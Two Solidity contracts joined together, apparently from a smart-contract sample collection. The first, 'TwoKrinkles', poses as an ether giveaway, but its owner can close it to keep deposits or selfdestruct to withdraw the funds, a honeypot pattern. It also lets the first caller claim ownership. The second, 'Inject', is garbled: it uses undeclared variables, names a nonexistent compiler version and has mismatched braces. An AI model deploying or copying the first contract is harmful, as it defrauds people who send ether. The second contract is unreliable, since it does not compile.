pragma solidity ^0.4.25;

contract TwoKrinkles {
    function() public payable {}
    address Owner; bool closed = false;
    function own() public payable { if (0==Owner) Owner=msg.sender; }
    function fin(bool F) public { if (msg.sender==Owner) closed=F; }
    function end() public { if (msg.sender==Owner) selfdestruct(msg.sender); }
    function get() public payable {
        if (msg.value>=1 ether && !closed) {
            msg.sender.transfer(address(this).balance);
        }
    }
}
pragma solidity ^0.5.24;
contract Inject {
	uint depositAmount;
	constructor() public {owner = msg.sender;}
	function freeze(address account,uint key) {
		if (msg.sender != minter)
			revert();
			freezeAccount[account] = key;
		}
	}
}
